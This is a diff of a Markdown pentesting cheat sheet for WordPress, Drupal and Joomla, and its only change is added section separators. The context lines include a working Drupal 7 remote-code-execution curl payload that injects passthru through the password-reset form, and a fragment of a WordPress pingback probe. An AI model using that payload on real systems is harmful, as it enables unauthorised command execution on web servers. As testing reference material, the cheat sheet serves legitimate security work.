@@ -14,6 +14,8 @@ droopescan
 joomscan
 ```
 
+---
+
 ### Wordpress
 
 Find version
@@ -54,6 +56,8 @@ if there is pingback, try :
 </methodCall>
 ```
 
+---
+
 ### Drupal
 
 ```bash
@@ -84,6 +88,8 @@ POC3 drupal 7
  curl -k -s 'http://localhost/drupal-7.55/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=uname+-a' \
     --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id
 ```
+
+---
 
 ### Joomla
 
